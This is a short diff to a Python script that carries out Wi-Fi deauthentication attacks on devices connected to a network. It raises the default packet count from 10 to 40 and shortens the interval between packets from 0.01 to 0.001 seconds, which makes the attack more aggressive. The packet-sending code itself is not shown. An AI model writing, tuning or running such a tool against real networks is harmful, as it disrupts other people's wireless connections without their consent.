@@ -53,8 +53,8 @@ def run_deauth_attacks(maccy, interface, packet_count, interval):
 def main():
     parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
     parser.add_argument('-i', '--interface', type=str, default='en0', help='Network interface to use for the attack (default: en0)')
-    parser.add_argument('-c', '--count', type=int, default=10, help='Number of deauthentication packets to send per attack (default: 10)')
-    parser.add_argument('-d', '--interval', type=float, default=0.01, help='Interval between deauthentication packets (default: 0.01)')
+    parser.add_argument('-c', '--count', type=int, default=40, help='Number of deauthentication packets to send per attack (default: 40)')
+    parser.add_argument('-d', '--interval', type=float, default=0.001, help='Interval between deauthentication packets (default: 0.001)')
     args = parser.parse_args()
 
     disconnect_cmd = f"networksetup -setairportpower {args.interface} off"
